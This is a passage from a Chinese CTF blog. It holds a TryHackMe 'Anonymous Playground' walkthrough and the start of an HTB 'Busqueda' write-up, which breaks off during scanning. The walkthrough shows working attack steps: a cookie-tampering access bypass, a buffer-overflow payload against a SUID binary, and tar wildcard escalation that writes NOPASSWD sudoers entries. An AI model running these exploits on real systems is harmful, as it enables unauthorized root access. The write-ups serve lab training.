[{"title":"[THM]  Anonymous Playground","url":"/2023/07/05/Anonymous_Playground/","content":"\n\n\n前言Anonymous Playground是TryHackMe上的一台hard难度的靶机，主要知识点是类仿射密码的解密、栈溢出利用以及tar提权。只要知识面充足这台机子还是很好解决的。\n信息收集端口、服务等扫描┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]└─$ sudo nmap -p- --min-rate=10000 10.10.1.59                          [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 10:08 CSTNmap scan report for 10.10.1.59Host is up (0.30s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 16.86 seconds                                                              ┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]└─$ sudo nmap -sV -sT -O -p22,80 10.10.1.59  Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 10:09 CSTNmap scan report for 10.10.1.59Host is up (0.26s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds\n\n开了22和80端口，虽然不多但是够用。\n漏扫nmap脚本扫描┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]└─$ sudo nmap --script=vuln 10.10.1.59     Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 10:10 CSTNmap scan report for 10.10.1.59Host is up (0.27s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE                                                                         22/tcp open  ssh                                                                             80/tcp open  http| http-sql-injection: |   Possible sqli for queries:|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=N%3BO%3DD%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=D%3BO%3DD%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=M%3BO%3DD%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=S%3BO%3DD%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=N%3BO%3DD%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider|_    http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider| http-enum: |   /robots.txt: Robots file|   /css/: Potentially interesting directory w/ listing on &#x27;apache/2.4.29 (ubuntu)&#x27;|   /images/: Potentially interesting directory w/ listing on &#x27;apache/2.4.29 (ubuntu)&#x27;|_  /js/: Potentially interesting directory w/ listing on &#x27;apache/2.4.29 (ubuntu)&#x27;|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.| http-aspnet-debug: |_  status: DEBUG is enabled|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-internal-ip-disclosure: |_  Internal IP Leaked: 127.0.1.1Nmap done: 1 IP address (1 host up) scanned in 52.40 seconds\n\nSQL注入是误报，不用看了。robots.txt值得一看。http-aspnet-debug说明ASP.NET的debug模式是开着的，查了一下可能可以用来查看网站服务器敏感文件，然而并没有查到介绍具体利用方式的资料，就先作罢。\nnikto┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]└─$ sudo nikto -h 10.10.1.59          - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.1.59+ Target Hostname:    10.10.1.59+ Target Port:        80+ Start Time:         2023-07-05 10:12:32 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.29 (Ubuntu)+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ /: Cookie access created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ /robots.txt: Entry &#x27;/zYdHuAKjP/&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file+ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ /images: IP address found in the &#x27;location&#x27; header. The IP is &quot;127.0.1.1&quot;. See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is &quot;127.0.1.1&quot;. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.+ /css/: Directory indexing found.+ /css/: This might be interesting.+ /images/: Directory indexing found.+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/+ 8076 requests: 0 error(s) and 13 item(s) reported on remote host+ End Time:           2023-07-05 10:49:23 (GMT8) (2211 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\nnikto也告诉我们，robots.txt文件中不希望我们访问/zYdHuAKjP/这个目录。此地无银三百两，真得看看。\nweb渗透先访问下网址。\n\nHomepage经典V字仇杀队面具，然后没啥信息了。点开导航栏的Operatives看看。\n\n发现一串id，说不定会有用户名啥的，先记住，cy一下。\n点contact没反应。\n那就先看看之前robots.txt中不想要我们的目录。\n\n发现说我们没被授权访问。我寻思你也妹让我登录啊，那就搞清楚咋回事。直接打开控制台看看request和response是啥情况。\n\n发现Cookie里面的access里面的value是denied。那我们直接改成granted试试能不能绕过这个授权检测。直接用curl发比较方便。当然用火狐的话可以直接resend里面改也可以。\n┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]└─$ curl http://10.10.1.59/zYdHuAKjP/ -v -H &quot;Cookie:access=granted&quot;*   Trying 10.10.1.59:80...* Connected to 10.10.1.59 (10.10.1.59) port 80 (#0)&gt; GET /zYdHuAKjP/ HTTP/1.1&gt; Host: 10.10.1.59&gt; User-Agent: curl/7.88.1&gt; Accept: */*&gt; Cookie:access=granted&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 05 Jul 2023 09:19:51 GMT&lt; Server: Apache/2.4.29 (Ubuntu)&lt; Set-Cookie: access=denied; expires=Fri, 04-Aug-2023 09:19:51 GMT; Max-Age=2592000; path=/&lt; Vary: Accept-Encoding&lt; Content-Length: 1379&lt; Content-Type: text/html; charset=UTF-8&lt; &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;title&gt;Proving Grounds&lt;/title&gt;    &lt;!-- Required meta tags --&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;    &lt;!-- Bootstrap CSS --&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/bootstrap.min.css&quot;&gt;    &lt;!-- Custom CSS --&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/main.css&quot;&gt;    &lt;link rel=&quot;shortcut icon&quot; href=&quot;/favicon.png&quot; type=&quot;image/x-icon&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container-fluid&quot;&gt;        &lt;ul class=&quot;nav justify-content-center mb-3&quot;&gt;            &lt;li class=&quot;nav-item&quot;&gt;                &lt;a class=&quot;nav-link active text-white&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;            &lt;/li&gt;            &lt;li class=&quot;nav-item&quot;&gt;                &lt;a class=&quot;nav-link text-white&quot; href=&quot;/operatives.php&quot;&gt;Operatives&lt;/a&gt;            &lt;/li&gt;            &lt;li class=&quot;nav-item&quot;&gt;                &lt;a class=&quot;nav-link text-white&quot; href=&quot;#&quot;&gt;Contact&lt;/a&gt;            &lt;/li&gt;        &lt;/ul&gt;        &lt;div class=&#x27;row&#x27;&gt;            &lt;div class=&#x27;col&#x27;&gt;                &lt;p class=&#x27;text-center&#x27;&gt;Access granted. &lt;br /&gt;                Well done getting this far.  But can you go further? &lt;br /&gt; &lt;br /&gt;                &lt;span style=&#x27;font-size: 30px;&#x27;&gt;hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN&lt;/span&gt;                &lt;/p&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;* Connection #0 to host 10.10.1.59 left intact\n\n解密密文我们可以发现我们已经成功授权访问了，返回了一串不知道是啥的字符串：hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN。一眼看过去不像是hash值，也不像什么编码。中间的两个::在我们的/etc/passwd或者shadow中很常见，比较像用户名和密码。那么问题又来了，怎么解密这个密码呢。一开始没啥想法，通神在旁边指出用户名和密码前面一截是一样的，而且后面有一块是zAfH像是前面用户反过来的，加上字符都是一个大写一个小写形成一对，很像两个字符对应一个字符。\n如果真的是这样的，那么前面的用户名就是一个5位的字符串，且第2位和第5位是一样的字符。这是时候想起之前我们发现的疑是用户名的那串名单，我们找找里面有没有符合以上条件的。发现还真有，就是magna。\n第二个问题又来了，虽然找到一部分明文和对应的密文，但是这两个字母是如何映射到一个字母的还需考虑，也就是说代换表还待我们发现。\n一开始很自然的就考虑到了ACSII码值，两个相减，发现不太对。又想到是不是字母表顺序，相减不对，相加其他都对，zA是27，如果解释为mod26就解释得通了。全部对应解出来，发现密码是一串有意义的短语，那很大概率是对了。所以总结起来其实这个映射就是。$$decrypt &#x3D; (x + Y) mod 26$$两字母相加模26，得到的结果代表明文在字母表中的顺序。实际上是个很简单的映射，但是如果想不出来就尬住。\n获取立足点既然拿到了登录凭证，那我们直接ssh登录。\n┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]└─$ ssh magna@10.10.1.59              The authenticity of host &#x27;10.10.1.59 (10.10.1.59)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:zKvTLbgKsGoKUlP7w/r2yJkjWulPOJtp0DhBDy/GlFQ.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;10.10.1.59&#x27; (ED25519) to the list of known hosts.magna@10.10.1.59&#x27;s password: Permission denied, please try again.magna@10.10.1.59&#x27;s password: Permission denied, please try again.magna@10.10.1.59&#x27;s password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Wed Jul  5 03:21:46 UTC 2023  System load:  0.14               Processes:           97  Usage of /:   22.9% of 19.56GB   Users logged in:     0  Memory usage: 35%                IP address for eth0: 10.10.1.59  Swap usage:   0%3 packages can be updated.0 updates are security updates.Last login: Fri Jul 10 13:54:20 2020 from 192.168.86.65magna@anonymous-playground:~$ \n\n成功登录，在home目录就能拿到第一个flag。\n漏洞利用缓冲区溢出在home目录下，不仅有flag，还有点别的有意思的东西。\nmagna@anonymous-playground:~$ ls -latotal 64drwxr-xr-x 7 magna  magna  4096 Jul 10  2020 .drwxr-xr-x 5 root   root   4096 Jul  4  2020 ..lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -&gt; /dev/null-rw-r--r-- 1 magna  magna   220 Jul  4  2020 .bash_logout-rw-r--r-- 1 magna  magna  3771 Jul  4  2020 .bashrcdrwx------ 2 magna  magna  4096 Jul  4  2020 .cachedrwxr-xr-x 3 magna  magna  4096 Jul  7  2020 .config-r-------- 1 magna  magna    33 Jul  4  2020 flag.txtdrwx------ 3 magna  magna  4096 Jul  4  2020 .gnupg-rwsr-xr-x 1 root   root   8528 Jul 10  2020 hacktheworlddrwxrwxr-x 3 magna  magna  4096 Jul  4  2020 .local-rw-r--r-- 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt-rw-r--r-- 1 magna  magna   807 Jul  4  2020 .profiledrwx------ 2 magna  magna  4096 Jul  4  2020 .ssh-rw------- 1 magna  magna   817 Jul  7  2020 .viminfo\n\n看看note_from_spooky.txt。\nmagna@anonymous-playground:~$ cat note_from_spooky.txt Hey Magna,Check out this binary I made!  I&#x27;ve been practicing my skills in C so that I can get better at ReverseEngineering and Malware Development.  I think this is a really good start.  See if you can break it!P.S. I&#x27;ve had the admins install radare2 and gdb so you can debug and reverse it right here!Best,Spooky\n\n发现spooky这小子要考考我们的逆向。那我们肯定要接受挑战。\n（虽然他好心给我们装了radare2和gdb，但是用不太习惯，真得ida吧）\n\n我们直接scp把文件下载下来，丢进我们心爱的ida。\n找到main函数，按F5看一下伪代码。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[64]; // [rsp+10h] [rbp-40h] BYREF  printf(&quot;Who do you want to hack? &quot;);  gets(v4);  return 0;&#125;\n\n关键词提取：gets(),我们最喜欢的缓冲区溢出。如果不太熟悉缓冲区溢出漏洞利用可以看看这篇文章,写的挺详细的。\n发现了漏洞，那我们怎么利用呢，我们可以注意到函数里还有一个叫call_bash的函数，看看他是干吗的。\n\n其中setuid(0x539u)其实就是设计S位（0x539u代表16进制无符号数 ，转换过来就是S）。然后就是调用sh。然而我们查看整个程序流程执行下来并不会执行这个函数。然而我们前面有缓冲区溢出的漏洞可以利用，那么接下来目标明确，构造payload覆盖返回地址，跳转到call_bash函数即可。\n那么前面覆盖的数据要多大呢，char v4[64]; // [rsp+10h] [rbp-40h] BYREF告诉我们数组有64字节，再加上64位程序BP是8字节。所以一共要填充64+8&#x3D;72位的字符，然后接上call_bash函数的返回地址0000000000400657，但是注意是小端存储所以要倒过来写。所以最终构造的payload如下：\npython -c &quot;print &#x27;a&#x27;*72+&#x27;\\x57\\x06\\x40\\x00\\x00\\x00\\x00\\x00&#x27;&quot;\n\n如果我们直接在命令行输入后面的16进制数会出问题，所以我们选择通过python输出，再管道符传给hacktheworld。\nmagna@anonymous-playground:~$ python -c &quot;print &#x27;a&#x27;*72+&#x27;\\x57\\x06\\x40\\x00\\x00\\x00\\x00\\x00&#x27;&quot; | ./hacktheworld Who do you want to hack? We are Anonymous.We are Legion.We do not forgive.We do not forget.[Message corrupted]...Well...done.Segmentation fault (core dumped)\n\n我们可以发现我们已经成功调用了call_bash函数,但是最后还是给我们报了Segmentation fault (core dumped)错误。何意啊？说好的sh呢。\n研究了一下，感觉可能是因为调用了sh后没有执行命令直接退出了。我们后面加个命令试试看吧。\nmagna@anonymous-playground:~$ (python -c &quot;print &#x27;a&#x27;*72+&#x27;\\x57\\x06\\x40\\x00\\x00\\x00\\x00\\x00&#x27;&quot;; cat) | ./hacktheworld Who do you want to hack? We are Anonymous.We are Legion.We do not forgive.We do not forget.[Message corrupted]...Well...done.whoamiSegmentation fault (core dumped)\n\n还是不行，虽然好像是可以了，但是输入命令后就会错误退出。奇了怪了。百思不得其解，去查了下别人的wp发现是将\\x57改成\\x58就可以了，很奇怪。明明函数的起始地址是57，且我们已经成功调用到了函数，为啥会有这种问题。非常不可名状。\nmagna@anonymous-playground:~$ (python -c &quot;print &#x27;a&#x27;*72+&#x27;\\x58\\x06\\x40\\x00\\x00\\x00\\x00\\x00&#x27;&quot;; cat) | ./hacktheworldWho do you want to hack? We are Anonymous.We are Legion.We do not forgive.We do not forget.[Message corrupted]...Well...done.whoamispookypython -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;spooky@anonymous-playground:~$\n\n虽然没法解释但是成功了。那就接着往下走吧。\n提权获得了spooky的权限，在home目录下能到第二个flag。\nspooky@anonymous-playground:/home/spooky$ ls -lals -latotal 36drwxr-xr-x 4 spooky spooky 4096 Jul 10  2020 .drwxr-xr-x 5 root   root   4096 Jul  4  2020 ..lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -&gt; /dev/null-rw-r--r-- 1 spooky spooky  220 Jul  4  2020 .bash_logout-rw-r--r-- 1 spooky spooky 3771 Jul  4  2020 .bashrc-rwxrwxrwx 1 spooky magna     0 Jul 10  2020 .confrc-r-------- 1 spooky spooky   33 Jul  4  2020 flag.txtdrwxrwxr-x 3 spooky spooky 4096 Jul  5  2020 .local-rw-r--r-- 1 spooky spooky  807 Jul  4  2020 .profiledrwx------ 2 spooky spooky 4096 Jul  8  2020 .ssh-rw-rw-r-- 1 spooky magna   535 Jul 10  2020 .webscript\n\n其中这个.webscript文件很可疑，看看它的内容。\nspooky@anonymous-playground:/home/spooky$ cat .webcat .webscript #!/bin/sh# get current user uid / gidCURR_UID=&quot;$(id -u)&quot;CURR_GID=&quot;$(id -g)&quot;# save filecat &gt; .cachefile.c &lt;&lt; EOF#include &lt;stdio.h&gt;int main()&#123;setuid($CURR_UID);setgid($CURR_GID);execl(&quot;/bin/bash&quot;, &quot;-bash&quot;, NULL);return 0;&#125;EOF# make folder where the payload will be savedmkdir .cachechmod 755 .cache# compile &amp; give SUIDgcc -w .cachefile.c -o .cache/.cachefilechmod 4755 .cache/.cachefile# clean uprm -rf ./&#x27;--checkpoint=1&#x27;rm -rf ./&#x27;--checkpoint-action=exec=sh .webscript&#x27;rm -rf .webscriptrm -rf .cachefile.c\n\n一路看下来这不是tar提权的典型应用吗？这是作者的提示吗？那我们看看定时任务里面是不是有tar自动打包任务吧。\nspooky@anonymous-playground:/home/dev$ cat /etc/crontabcat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user  command17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )*/1 *   * * *   root    cd /home/spooky &amp;&amp; tar -zcf /var/backups/spooky.tgz *#\n\n果不其然，确实有。而且tar *,那就可以直接利用了。\ntar提权\ntar提权第一步，先写好利用脚本。\nspooky@anonymous-playground:/home/spooky$ echo &#x27;#!/bin/bash&#x27; &gt; exp.shecho &#x27;#!/bin/bash&#x27; &gt; exp.shspooky@anonymous-playground:/home/spooky$ echo &#x27;&#x27; &gt;&gt; exp.shecho &#x27;&#x27; &gt;&gt; exp.shspooky@anonymous-playground:/home/spooky$ echo &#x27;echo &quot;spooky ALL=(ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#x27; &gt;&gt; exp.shALL&quot; &gt;&gt; /etc/sudoers&#x27; &gt;&gt; exp.shPASSWD:Aspooky@anonymous-playground:/home/spooky$ cat exp.shcat exp.sh#!/bin/bashecho &quot;spooky ALL=(ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers\n\n我们希望把当前用户写入sudoers用户组，之后就可以为所欲为。\n\n第二步创建checkpoint。\nspooky@anonymous-playground:/home/spooky$ echo &#x27;&#x27; &gt; &#x27;--checkpoint-action=exec=sh exp.sh&#x27;    exp.sh&#x27;&gt; &#x27;--checkpoint-action=exec=sh spooky@anonymous-playground:/home/spooky$ echo &#x27;&#x27; &gt; --checkpoint=1echo &#x27;&#x27; &gt; --checkpoint=1spooky@anonymous-playground:/home/spooky$ ls -lals -latotal 48drwxr-xr-x 4 spooky spooky 4096 Jul  5 09:05  .drwxr-xr-x 5 root   root   4096 Jul  4  2020  ..lrwxrwxrwx 1 root   root      9 Jul  4  2020  .bash_history -&gt; /dev/null-rw-r--r-- 1 spooky spooky  220 Jul  4  2020  .bash_logout-rw-r--r-- 1 spooky spooky 3771 Jul  4  2020  .bashrc-rw-rw-r-- 1 spooky magna     1 Jul  5 09:05 &#x27;--checkpoint=1&#x27;-rw-rw-r-- 1 spooky magna     1 Jul  5 09:04 &#x27;--checkpoint-action=exec=sh exp.sh&#x27;-rwxrwxrwx 1 spooky magna     0 Jul 10  2020  .confrc-rw-rw-r-- 1 spooky magna    66 Jul  5 09:02  exp.sh-r-------- 1 spooky spooky   33 Jul  4  2020  flag.txtdrwxrwxr-x 3 spooky spooky 4096 Jul  5  2020  .local-rw-r--r-- 1 spooky spooky  807 Jul  4  2020  .profiledrwx------ 2 spooky spooky 4096 Jul  8  2020  .ssh-rw-rw-r-- 1 spooky magna   535 Jul 10  2020  .webscript\n\n第三步猎人布下了陷阱正在等待猎物。因为定时任务表里是*/1应该是每分钟都会执行一次，所以很快就会出结果。\n\n过了一会尝试sudo -l发现搞定了。\nspooky@anonymous-playground:/home/spooky$ sudo -lsudo -lMatching Defaults entries for spooky on anonymous-playground:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser spooky may run the following commands on anonymous-playground:    (ALL) NOPASSWD: ALL    (ALL) NOPASSWD: ALLspooky@anonymous-playground:/home/spooky$ sudo susudo suroot@anonymous-playground:/home/spooky# cd /rootcd /rootroot@anonymous-playground:~# ls -lals -latotal 408drwx------  7 root root   4096 Jul  8  2020 .drwxr-xr-x 24 root root   4096 Jul  4  2020 ..lrwxrwxrwx  1 root root      9 Jul  4  2020 .bash_history -&gt; /dev/null-rw-r--r--  1 root root   3106 Apr  9  2018 .bashrcdrwx------  3 root root   4096 Jul  6  2020 .cachedrwxr-xr-x  3 root root   4096 Jul  7  2020 .config-r--------  1 root root     33 Jul  4  2020 flag.txt-rw-------  1 root root    242 Jul  8  2020 .gdb_history-rw-r--r--  1 root root     29 Jul  7  2020 .gdbinit-rw-r--r--  1 root root 356593 Jul  7  2020 .gdbinit-gef.pydrwx------  3 root root   4096 Jul  4  2020 .gnupgdrwxr-xr-x  3 root root   4096 Jul  4  2020 .local-rw-r--r--  1 root root    148 Aug 17  2015 .profile-rw-r--r--  1 root root     66 Jul  5  2020 .selected_editordrwx------  2 root root   4096 Jul  7  2020 .ssh-rw-r--r--  1 root root    215 Jul  7  2020 .wget-hstsroot@anonymous-playground:~# cat flag.txt\n\n拿到root flag。\n\n\n总结这台机子比较偏向ctf，各方向知识点都有点，虽然都不难，但是要求我们开阔知识面。每样都得会点。\n","categories":["TryHackMe"],"tags":["walkthrough"]},{"title":"[HTB]  Busqueda","url":"/2023/07/19/Busqueda/","content":"\n\n\n前言下次还填非常简单！\n信息收集nmap$ sudo nmap -p- --min-rate=10000 10.10.11.208Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 22:34 EDTNmap scan report for 10.10.11.208Host is up (0.075s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 10.09 seconds$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.208Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 22:35 EDTNmap scan report for 10.10.11.208Host is up (0.074s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)80/tcp open  http    Apache httpd 2.4.52|_http-server-header: Apache/2.4.52 (Ubuntu)|_http-title: Did not follow redirect to http://searcher.htb/Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds$ sudo nmap --script=vuln 10.10.11.208Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 22:45 EDTPre-scan script results:| broadcast-avahi-dos:|   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for searcher.htb (10.10.11.208)Host is up (0.075s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-csrf:| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=searcher.htb|   Found the following possible CSRF vulnerabilities:||     Path: http://searcher.htb:80/|     Form id: engine-select|_    Form action: /search|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.Nmap done: 1 IP address (1 host up) scanned in 58.20 seconds\n\n开了22和80，并且IP会重定向到http://searcher.htb ，那我们就把它加进host。\nwhatweb$ sudo whatweb http://searcher.htb/http://searcher.htb/ [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]\n\n我们可以发现其使用了Werkzeug[2.1.2]。Werkzeug是一个WSGI工具包，可以作为一个Web框架的底层库。我们searchspolit一下发现其存在Werkzeug - ‘Debug Shell’ Command Execution，可惜执行一下exp会发现debug模式并没有开利用不上。\nnikto$ sudo nikto -h http://searcher.htb/- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.11.208+ Target Hostname:    searcher.htb+ Target Port:        80+ Start Time:         2023-07-18 22:41:05 (GMT-4)---------------------------------------------------------------------------+ Server: Werkzeug/2.1.2 Python/3.10.6+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ : Server banner changed from &#x27;Werkzeug/2.1.2 Python/3.10.6&#x27; to &#x27;Apache/2.4.52 